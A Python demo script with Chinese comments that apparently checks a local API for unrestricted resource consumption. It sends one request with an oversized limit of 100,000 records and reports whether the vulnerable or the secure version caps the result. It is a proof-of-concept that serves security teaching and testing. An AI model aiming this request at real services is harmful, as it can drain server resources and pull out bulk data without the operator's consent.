"""資源耗盡攻擊腳本:要求一個明顯過大的 limit,看伺服器是否照單全收撈出巨量資料。

同一支腳本打 vulnerable 與 secure 兩版,靠實際回傳筆數證明漏洞是否成立:
- vulnerable:limit 無上限 → 回傳我們要求的巨量筆數 → 資源被濫用。
- secure:limit 被夾到硬上限 → 回傳筆數遠低於要求 → 攻擊被擋。
"""

import requests

ABUSE_LIMIT = 100_000        # 攻擊者要求的過大筆數(demo 取 10 萬,兼顧速度與說服力)
UNRESTRICTED_THRESHOLD = 1_000  # 回傳超過此數即視為未受限
REQUEST_TIMEOUT_SECONDS = 30


def run_resource_exhaustion_attack(base_url):
    """回傳 (是否未受限, 說明字串)。是否未受限=True 代表漏洞成立。"""
    resp = requests.get(
        f"{base_url}/api/records",
        params={"limit": ABUSE_LIMIT},
        timeout=REQUEST_TIMEOUT_SECONDS,
    )
    if resp.status_code != 200:
        return False, f"請求未成功(status={resp.status_code})"

    returned = resp.json().get("count", 0)
    payload_mb = len(resp.content) / (1024 * 1024)
    if returned > UNRESTRICTED_THRESHOLD:
        return True, f"要求 {ABUSE_LIMIT:,} 筆、實得 {returned:,} 筆(約 {payload_mb:.1f} MB),伺服器毫無節制"
    return False, f"要求 {ABUSE_LIMIT:,} 筆、只給 {returned:,} 筆(約 {payload_mb:.2f} MB),上限生效"


if __name__ == "__main__":
    import sys

    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5041"
    unrestricted, message = run_resource_exhaustion_attack(target)
    print(("[漏洞成立] " if unrestricted else "[已防禦] ") + message)
